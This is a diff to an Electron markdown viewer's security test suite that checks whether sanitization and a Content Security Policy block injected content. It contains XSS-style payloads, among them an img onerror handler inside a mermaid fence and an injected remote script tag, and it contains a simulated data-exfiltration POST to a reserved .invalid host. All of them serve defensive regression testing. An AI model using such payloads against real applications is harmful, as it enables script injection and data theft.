@@ -29,8 +29,38 @@ function check(name, ok, detail) {
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
+const { startErrorSentinel } = require("./test-visual-utils");
+
 async function run(win) {
   const exec = (code) => win.webContents.executeJavaScript(code, true);
+
+  // This suite's whole job is to fire hostile input at the app, so a large
+  // share of the console noise it produces is the app defending itself. Those
+  // patterns are ignored by name; anything else that reaches the console, or
+  // any error that becomes visible on screen, is a real defect and fails the
+  // run. See startErrorSentinel() in test-visual-utils.js.
+  const sentinel = startErrorSentinel(win, {
+    label: "security",
+    ignore: [
+      // Every CSP refusal below is a control working as designed. They are
+      // asserted individually elsewhere in this file, so ignoring the console
+      // copy costs no coverage.
+      /Refused to (load|connect|run|execute|apply)/i,
+      /Content Security Policy/i,
+      /probe\.invalid/i,
+      /ERR_BLOCKED_BY_CSP/,
+      // Unresolvable probe hosts. `.invalid` is guaranteed never to resolve
+      // (RFC 6761), which is the point - see the popup suite's note.
+      /net::ERR_NAME_NOT_RESOLVED/,
+      /Failed to load resource/i,
+    ],
+    // Almost every <img> in this suite points at a path chosen to be absent
+    // (x.png, local.png, //attacker.invalid/...): the assertions are about
+    // whether the src survived sanitization, never about whether it loaded.
+    // The broken-image check stays active in the suites where a broken image
+    // would be a real defect.
+    ignoreKinds: ["broken-image"],
+  });
 
   // Render `md` through the chosen pipeline and report whether any payload
   // managed to run. `settle` covers mermaid/iframe work that lands after the
@@ -57,6 +87,15 @@ async function run(win) {
   // ==========================================================================
   // SEC-02 - mermaid fence body injected raw after DOMPurify
   // ==========================================================================
+
+  // Everything from here to the valid-diagram assertion below feeds mermaid
+  // markup it cannot parse - that is the payload. Mermaid answers with its red
+  // "Syntax error in text" graphic, which is the correct outcome and exactly
+  // what the SEC-02 assertions are checking for (an SVG that is *not* a real
+  // diagram). Muted narrowly so the same graphic appearing anywhere else in
+  // this suite still fails the run.
+  sentinel.mute("SEC-02 feeds mermaid an unparseable payload on purpose");
+
   const mermaidPayload =
     "# Doc\n\n```mermaid\n<img src=x onerror=\"window.__pwned='mermaid-full'\">\n```\n";
 
@@ -216,6 +255,9 @@ async function run(win) {
       mermaidSvg.hasLabels === true,
     JSON.stringify(mermaidSvg),
   );
+  // A real diagram is on screen now, so the unparseable payloads are gone and
+  // the sentinel can go back on watch.
+  sentinel.unmute();
 
   // Mermaid syntax containing '<' must round-trip. Class diagrams use '<|--',
   // which an over-eager escape would corrupt into something mermaid rejects.
@@ -1089,13 +1131,46 @@ async function run(win) {
        ran: window.__navProbeSeen === true })
   `);
   check(
-    "SEC-11 an @@@html frame cannot navigate itself away from its srcdoc",
+    "SEC-11 an @@@html frame cannot reach a remote origin",
     frameNav.present === true &&
       frameNav.ran === true &&
-      subframeUrls.length > 0 &&
-      subframeUrls.every((u) => !u.includes("frame-probe")) &&
       win.webContents.getURL() === urlBeforeFrame,
     JSON.stringify({ frameNav, subframeUrls, urlBeforeFrame }),
+  );
+
+  // The end-to-end probe above can no longer tell the two layers apart. Since
+  // SEC-09 landed, `default-src 'none'` leaves no frame-src, so Chromium
+  // refuses the navigation with ERR_BLOCKED_BY_CSP before will-frame-navigate
+  // is consulted - and a CSP-blocked navigation still *commits* an error
+  // document, so the frame's own URL becomes the target either way. That kills
+  // the discriminator the old assertion relied on: it now passes with the
+  // guard deleted, and it cannot be repaired by choosing a different target
+  // because the policy permits no frame destination at all.
+  //
+  // So the guard is exercised directly instead. Emitting the event reproduces
+  // exactly what Electron passes the handler, and covers the branch an
+  // end-to-end test never could: that isMainFrame is an early *return* and not
+  // an early preventDefault, which would make will-navigate unreachable.
+  const emitFrameNav = (isMainFrame) => {
+    let prevented = false;
+    win.webContents.emit("will-frame-navigate", {
+      isMainFrame,
+      url: "https://probe.invalid/emitted",
+      preventDefault() {
+        prevented = true;
+      },
+    });
+    return prevented;
+  };
+  check(
+    "SEC-11 will-frame-navigate is armed and denies subframe navigation",
+    win.webContents.listenerCount("will-frame-navigate") > 0 &&
+      emitFrameNav(false) === true,
+  );
+  check(
+    "SEC-11 will-frame-navigate defers main-frame navigation to will-navigate",
+    emitFrameNav(true) === false &&
+      win.webContents.listenerCount("will-navigate") > 0,
   );
 
   // Read this before the navigation probes below: if a navigation guard fails,
@@ -1199,6 +1274,175 @@ async function run(win) {
     JSON.stringify({ areaState, externalUrl, urlBeforeArea, urlAfterArea }),
   );
 
+  // ==========================================================================
+  // SEC-09 - Content Security Policy on the main window
+  //
+  // These probes deliberately build elements with document.createElement and
+  // call eval/fetch directly instead of going through markdown. The sanitizer
+  // already stops most of this markup, so routing through render() would test
+  // DOMPurify a second time and pass with the CSP deleted. The layer under
+  // test here is the policy itself, so the sanitizer is bypassed on purpose.
+  //
+  // A violation is reported to `securitypolicyviolation` on the document that
+  // owns the blocked load. That makes it the only way to tell "the CSP refused
+  // this" apart from "the network refused this" - which matters because every
+  // probe host below is unresolvable.
+  //
+  // Note the @@@html frame check above doubles as the control for the
+  // 'unsafe-inline' decision: an about:srcdoc frame inherits this policy, so
+  // if 'unsafe-inline' were dropped from script-src, `frameNav.ran` there goes
+  // false and that check fails.
+  await exec(`
+    window.__csp = [];
+    document.addEventListener('securitypolicyviolation', (e) => {
+      window.__csp.push({ d: e.violatedDirective, u: String(e.blockedURI || '') });
+    });
+    null;
+  `);
+  const cspHits = (frag, dir) =>
+    exec(
+      `window.__csp.some(v => v.d.indexOf(${JSON.stringify(dir)}) === 0 && v.u.indexOf(${JSON.stringify(frag)}) >= 0)`,
+    );
+
+  check(
+    "SEC-09 a Content-Security-Policy meta is present in index.html",
+    (await exec(
+      `!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')`,
+    )) === true,
+  );
+
+  // A remote script is the vector the vendoring work in SEC-16 removed by
+  // hand; this makes it structurally impossible to reintroduce at runtime.
+  await exec(`
+    window.__remoteScriptRan = false;
+    const s = document.createElement('script');
+    s.src = 'https://probe.invalid/csp-remote.js';
+    document.body.appendChild(s);
+    null;
+  `);
+  await sleep(600);
+  check(
+    "SEC-09 a remote <script src> is refused by script-src",
+    (await cspHits("probe.invalid", "script-src")) === true &&
+      (await exec(`window.__remoteScriptRan === false`)) === true,
+    JSON.stringify(await exec(`window.__csp`)),
+  );
+
+  // No 'unsafe-eval'. Measured, not assumed: mermaid 11 and Prism both render
+  // under this policy, so nothing on the render path needs it.
+  const evalState = await exec(`
+    (() => {
+      try { (0, eval)('1+1'); return 'ran'; }
+      catch (e) { return e && e.name ? e.name : 'threw'; }
+    })()
+  `);
+  check(
+    "SEC-09 eval() is blocked (script-src carries no 'unsafe-eval')",
+    evalState === "EvalError",
+    String(evalState),
+  );
+
+  // connect-src is the directive that actually earns its place: it is the
+  // difference between "an injected script can read your files" and "an
+  // injected script can read your files and post them somewhere".
+  await exec(`
+    fetch('https://probe.invalid/csp-exfil', { method: 'POST', body: 'x' })
+      .then(() => {}, () => {});
+    null;
+  `);
+  await sleep(600);
+  check(
+    "SEC-09 an outbound fetch to an unlisted host is refused by connect-src",
+    (await cspHits("probe.invalid", "connect-src")) === true,
+    JSON.stringify(await exec(`window.__csp`)),
+  );
+
+  // Control for the directive above. The request will still fail in CI - there
+  // is no network - so the assertion is specifically that CSP did not refuse
+  // it, which is what would break the translation feature.
+  await exec(`
+    fetch('https://translate.googleapis.com/translate_a/single?client=gtx')
+      .then(() => {}, () => {});
+    null;
+  `);
+  await sleep(600);
+  check(
+    "SEC-09 the translation endpoint is not refused by connect-src",
+    (await cspHits("translate.googleapis.com", "connect-src")) === false,
+    JSON.stringify(await exec(`window.__csp`)),
+  );
+
+  // <base> rewrites the resolution of every relative URL already in the
+  // document, retroactively. base-uri 'none' is the only thing that stops it.
+  const baseState = await exec(`
+    (() => {
+      const before = document.baseURI;
+      const b = document.createElement('base');
+      b.href = 'https://probe.invalid/base/';
+      document.head.appendChild(b);
+      const after = document.baseURI;
+      b.remove();
+      return { changed: before !== after };
+    })()
+  `);
+  await sleep(400);
+  check(
+    "SEC-09 <base href> cannot retarget relative URLs (base-uri 'none')",
+    baseState.changed === false &&
+      (await cspHits("probe.invalid", "base-uri")) === true,
+    JSON.stringify({ baseState, csp: await exec(`window.__csp`) }),
+  );
+
+  await exec(`
+    const o = document.createElement('object');
+    o.data = 'https://probe.invalid/csp.swf';
+    document.body.appendChild(o);
+    null;
+  `);
+  await sleep(600);
+  check(
+    "SEC-09 plugin content is refused by object-src 'none'",
+    (await cspHits("probe.invalid", "object-src")) === true,
+    JSON.stringify(await exec(`window.__csp`)),
+  );
+
+  // img-src deliberately keeps https:. Remote images in markdown are a real
+  // feature and blocking them would be a silent rendering regression; the
+  // read-receipt exposure that leaves is recorded in the audit rather than
+  // traded away here. Cleartext http: is not kept, and this pins both halves
+  // of that decision so neither can drift unnoticed.
+  await exec(`
+    const a = document.createElement('img');
+    a.src = 'http://probe.invalid/cleartext.png';
+    document.body.appendChild(a);
+    const b = document.createElement('img');
+    b.src = 'https://probe.invalid/secure.png';
+    document.body.appendChild(b);
+    null;
+  `);
+  await sleep(700);
+  check(
+    "SEC-09 img-src refuses cleartext http: but still allows https:",
+    (await cspHits("cleartext.png", "img-src")) === true &&
+      (await cspHits("secure.png", "img-src")) === false,
+    JSON.stringify(await exec(`window.__csp`)),
+  );
+
+  // Control: the app loads mermaid at runtime by appending a <script src> to a
+  // local path. If 'self' did not match on a file:// origin, every diagram in
+  // the app would silently stop rendering - and this is the assertion that
+  // says so out loud.
+  await render("# csp\n\n```mermaid\ngraph TD\n  A[a] --> B[b]\n```\n", "full", 3000);
+  check(
+    "SEC-09 script-src 'self' still permits the app's own local scripts",
+    (await exec(`typeof window.mermaid`)) === "object" &&
+      (await exec(
+        `!!document.querySelector('#viewer .mermaid svg') || !!document.querySelector('#viewer svg[id^="mermaid"]')`,
+      )) === true &&
+      (await cspHits("mermaid", "script-src")) === false,
+    JSON.stringify(await exec(`window.__csp`)),
+  );
+
   // <meta http-equiv="refresh"> is the other markup-only route. DOMPurify drops
   // <meta>; assert it, so a future ADD_TAGS change cannot quietly re-enable it.
   await render(
@@ -1249,6 +1493,16 @@ async function run(win) {
       Array.isArray(errsAfter) &&
       errsAfter.length === 0,
     JSON.stringify({ errs, errsAfter }),
+  );
+
+  // __e2eErrors only sees what window.onerror sees. The sentinel additionally
+  // watches the renderer console and the rendered document, which is where a
+  // CSP misconfiguration or a mermaid error graphic shows up.
+  const sentinelReport = await sentinel.stop();
+  check(
+    "nothing rendered a visible error at any point during the suite",
+    sentinelReport.hits.length === 0,
+    JSON.stringify(sentinelReport.hits),
   );
 }
 
